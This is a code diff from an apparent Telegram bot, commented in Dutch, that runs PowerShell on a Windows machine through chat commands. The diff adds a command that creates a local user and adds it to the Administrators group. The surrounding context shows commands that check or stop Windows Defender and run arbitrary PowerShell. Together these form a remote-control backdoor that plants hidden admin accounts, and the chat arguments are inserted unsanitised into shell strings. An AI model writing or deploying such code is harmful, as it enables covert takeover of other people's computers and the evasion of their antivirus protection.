@@ -91,6 +91,32 @@ async def stopDefender_command(update: Update, context: ContextTypes.DEFAULT_TYP
     commandOutput = run_powershell_command('Get-MpComputerStatus | Select-Object RealTimeProtectionEnabled')
     await update.message.reply_text(f"Terminal output:```\n{commandOutput}\n```", parse_mode='MarkdownV2')
 
+async def newuser_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """
+    - maak een nieuwe windows user aan
+      - eerste argument is de username
+      - tweede argument is de password
+    """
+    # spaties na de command zorgen ervoor dat de command als losse list items opgeslagen worden in context.args
+    # maak een een list met maar 2 argumenten, waarvan de eerste aangeeft als admin rechtenb nodig zijn
+    args = command_list(context.args)
+
+    if len(context.args) == 2 :
+        await context.bot.send_message(chat_id=update.effective_chat.id, text="Command wordt uitgevoerd...")
+    else:
+        await update.message.reply_text("Geef tenimste 2 argumenten mee als je de command aanroept")
+        return
+
+    try:
+        run_powershell_command(f'$Password = ConvertTo-SecureString -AsPlainText {context.args[1]} -Force', True)
+        commandOutput1 =  run_powershell_command(f'New-LocalUser -Name "{context.args[0]}" -Password $Password')
+        run_powershell_command(f'Add-LocalGroupMember -Group "Administrators" -Member "{context.args[0]}"')
+        
+        commandOutput2 = run_powershell_command('Get-LocalGroupMember -Group "Administrators"')
+        await update.message.reply_text(f"Terminal output:```\n{commandOutput1}\n{commandOutput2}\n```", parse_mode='MarkdownV2')
+    except ValueError:
+        await update.message.reply_text(f"Er is een fout opgetreden bij het uitvoeren: {ValueError}")
+
 async def custom_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """
     - run een custom powershell command
